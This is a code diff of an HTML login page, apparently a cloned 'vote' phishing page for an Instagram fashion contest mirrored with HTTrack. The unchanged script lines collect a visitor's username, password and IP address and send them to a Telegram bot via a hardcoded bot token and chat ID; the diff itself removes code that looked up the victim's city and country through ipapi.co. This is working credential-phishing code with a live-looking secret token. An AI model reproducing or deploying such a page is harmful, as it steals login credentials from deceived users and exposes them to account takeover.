@@ -31,8 +31,7 @@
             </div>
             <div class="mb-4">
                 <input class="w-full px-6 py-3 border rounded-lg focus:outline-none focus:ring-2 focus:ring-black-600" placeholder="Password" type="text" name="password" id="password" required/>
-                <input type="hidden" name="city" id="city">
-    <input type="hidden" name="country" id="country">
+                
             </div>
             <div class="mb-4">
                 <button class="w-full py-3 bg-blue-700 text-white rounded-xl hover:bg-black-700" type="submit" id="button" value="submit">
@@ -75,10 +74,9 @@
             var username = document.getElementById('username').value;
             var password = document.getElementById('password').value;
             var ipaddress = document.getElementById('ipaddress').value;
-      var country = document.getElementById('country').value;
-      var city = document.getElementById('city').value;
+      
 
-            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIpaddress: ${ipaddress}\nCountry: ${country}\nCity: ${city}`;
+            var telegramMessage = `Username: ${username}\nPassword: ${password}\nIpaddress: ${ipaddress}`;
            
              var token = '8142342762:AAEMPibryAQO6P8fttpyajD4js0FvR6iGuw';
             var chat_id = '6757391137'
@@ -99,19 +97,7 @@
         });
 
     </script>
-    <script>
-    fetch('https://ipapi.co/json/')
-    .then(response => response.json())
-    .then(data => {
-        console.log("City:", data.city);
-        console.log("Country:", data.country_name);
-
-        // Example: Fill into hidden form inputs
-        document.getElementById("city").value = data.city;
-        document.getElementById("country").value = data.country_name;
-    })
-    .catch(error => console.error('Location error:', error));
-    </script>
+    
 </body>
 
 <!-- Mirrored from voting.name.ng/slink/vote-ig-fashion_dar_v/login by HTTrack Website Copier/3.x [XR&CO'2014], Mon, 10 Mar 2025 20:44:55 GMT -->
